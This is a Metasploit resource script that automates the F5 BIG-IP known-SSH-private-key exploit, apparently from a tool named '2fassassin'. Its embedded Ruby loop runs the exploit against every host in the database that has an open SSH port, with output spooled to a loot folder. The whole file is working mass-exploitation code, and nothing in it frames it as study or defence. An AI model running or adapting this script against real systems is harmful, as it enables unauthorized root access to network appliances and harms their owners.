use exploit/linux/ssh/f5_bigip_known_privkey
set VERBOSE true
spool /root/.msf4/loot/f5_bigip_known_privkey
set THREADS 1
set AutoRunScript multi_console_command -rc /root/2fassassin/check/vuln/f5/ext

<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "ssh" and service.state == "open"
      self.run_single("set RHOST #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
      self.run_single("exit -y")
    end
  end
end
</ruby>
